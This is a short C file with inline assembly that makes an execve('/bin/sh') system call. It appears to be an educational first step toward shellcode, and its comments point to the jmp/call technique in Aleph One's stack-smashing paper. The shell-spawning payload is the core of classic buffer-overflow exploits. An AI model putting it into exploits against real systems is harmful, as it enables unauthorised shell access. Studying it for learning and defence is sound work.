
// we use the label 1: here that determines the 
// address of the string /bin/sh.
// The address is set at assemble time.

// in our exploit we do not have this address. So
// we need to resort to jmp and call as mentioned in the
// alpeh1 paper.

 void main(void){
 asm( 
        "movl $1f, %esi;"
        "movl %esi, 0x8(%esi);"
 	"movb $0x0, 0x7(%esi);"
	"movl $0x0, 0xc(%esi);"
	"movl $0xb, %eax;"
	"movl %esi, %ebx;"
	"leal 0x8(%esi), %ecx;"
	"leal 0xc(%esi), %edx;"
	"int $0x80;"
	".section .data;"
	"1: .string \"/bin/sh         \";"
	".section .text;"
    );
 }
